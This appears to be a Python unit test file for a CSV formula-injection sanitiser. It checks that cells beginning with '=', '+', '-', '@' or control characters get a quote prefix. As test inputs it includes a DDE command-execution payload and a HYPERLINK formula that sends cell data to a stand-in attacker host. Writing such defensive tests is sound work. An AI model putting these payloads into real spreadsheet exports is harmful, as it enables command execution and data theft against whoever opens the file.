"""Unit tests for the CSV formula-injection sanitiser (GHSA-352q, CWE-1236)."""

from utils.csv_safe import csv_safe


def test_prefixes_every_formula_lead():
    for lead in ("=", "+", "-", "@", "\t", "\r"):
        assert csv_safe(f"{lead}cmd|' /C calc'!A0") == f"'{lead}cmd|' /C calc'!A0"


def test_passes_ordinary_text_through():
    assert csv_safe("Alice") == "Alice"
    assert csv_safe("a=b+c") == "a=b+c"  # '=' not in the leading position
    assert csv_safe("") == ""


def test_none_and_bools():
    assert csv_safe(None) == ""
    assert csv_safe(True) == "yes"
    assert csv_safe(False) == "no"


def test_server_numbers_are_not_mangled():
    # A value that arrived as a number is server-computed, never an attacker
    # formula — a negative int must stay a number, not become text.
    assert csv_safe(-5) == "-5"
    assert csv_safe(42) == "42"
    assert csv_safe(3.5) == "3.5"


def test_negative_number_string_is_still_guarded():
    # An attacker-supplied STRING beginning with '-' IS guarded (a spreadsheet
    # would evaluate "-5+3" as a formula).
    assert csv_safe("-5+3") == "'-5+3"


def test_hyperlink_exfil_payload_is_neutralised():
    payload = '=HYPERLINK("http://evil.example/?x="&A2,"details")'
    assert csv_safe(payload) == "'" + payload
